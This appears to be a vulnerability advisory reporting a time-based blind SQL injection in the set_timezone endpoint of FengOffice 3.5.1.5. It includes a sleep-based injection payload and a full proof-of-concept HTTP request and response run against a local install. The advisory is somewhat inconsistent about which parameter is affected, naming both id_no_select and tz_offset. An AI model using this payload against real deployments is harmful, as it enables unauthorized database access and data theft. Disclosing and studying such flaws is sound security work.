# Titles: SQLi in fengoffice_3.5.1.5  
#### Vendor: https://www.fengoffice.com/

#### Software: https://trials.fengoffice.com/register?edition=starter

## Description:

The `id_no_select` parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the `id_no_select` parameter, and a general error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.  Additionally, the payload '+(select*from(select(sleep(20)))a)+' was submitted in the `id_no_select` parameter. The application took 21140 milliseconds to respond to the request, compared with 355 milliseconds for the original request, indicating that the injected SQL command caused a time delay.

### **1. Vulnerability Description**

The `id_no_select` parameter in FengOffice 3.5.1.5 is vulnerable to **time-based blind SQL injection**.

### Proof of Concept

- Submitting a single quote (`'`) triggered a database error, while two quotes (`''`) suppressed the error, indicating improper input sanitization.
- The payload `'+(select*from(select(sleep(20)))a)+'` caused a delayed response (21,140 ms vs. 355 ms), confirming SQL command execution.

### **2. Vulnerability Details**

- **Type**: SQL Injection (Time-Based Blind)

  Impact

  - Unauthorized database access (data leakage, manipulation, or deletion).
  - Potential compromise of admin credentials or sensitive information.

- Affected Component

  - Endpoint: `/index.php?c=account&a=set_timezone`
  - Parameter: `tz_offset` (via `id_no_select`).

### **3. Proof of Concept (PoC)**

**Exploit Request**:

```http
GET /fengoffice_3.5.1.5/fengoffice_3.5.1.5/index.php?context={}&currentdimension=0&ajax=true&c=account&a=set_timezone&tz_name=Europe%2FSofia&tz_offset=3'%2b(select*from(select(sleep(20)))a)%2b'&_dc=1746872695052 HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: PHPSESSID=f0keqkg63m62iapui7lch4ed61; http___localhost_fengoffice_3_5_1_5_fengoffice_3_5_1_5id=2; http___localhost_fengoffice_3_5_1_5_fengoffice_3_5_1_5token=5e177a5e794b55bb3f2e58843196e01fc1760008; http___localhost_fengoffice_3_5_1_5_fengoffice_3_5_1_5remember=1
X-Requested-With: XMLHttpRequest
Referer: http://localhost/fengoffice_3.5.1.5/fengoffice_3.5.1.5/index.php?c=access&a=index
Sec-CH-UA: "Chromium";v="136", "Not;A=Brand";v="24", "Google Chrome";v="136"
Sec-CH-UA-Platform: "Windows"
Sec-CH-UA-Mobile: ?0
Content-Length: 0
```

**Response**:

```http
HTTP/1.1 200 OK
Date: Sun, 11 May 2025 06:39:42 GMT
Server: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.15
X-Powered-By: PHP/5.6.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: http___localhost_fengoffice_3_5_1_5_fengoffice_3_5_1_5id=2; expires=Sun, 25-May-2025 06:39:43 GMT; Max-Age=1209600; path=/
Set-Cookie: http___localhost_fengoffice_3_5_1_5_fengoffice_3_5_1_5token=5e177a5e794b55bb3f2e58843196e01fc1760008; expires=Sun, 25-May-2025 06:39:43 GMT; Max-Age=1209600; path=/
Set-Cookie: http___localhost_fengoffice_3_5_1_5_fengoffice_3_5_1_5remember=1; expires=Sun, 25-May-2025 06:39:43 GMT; Max-Age=1209600; path=/
Content-Length: 245
Connection: close
Content-Type: text/javascript; charset=UTF-8

{"contents":{},"current":false,"errorCode":0,"errorMessage":"","u":2,"scripts":["http:\/\/localhost\/fengoffice_3.5.1.5\/fengoffice_3.5.1.5\/public\/assets\/javascript\/og\/modules\/addMessageForm.js?rev=1"],"currentPanel":"account","events":[]}
```

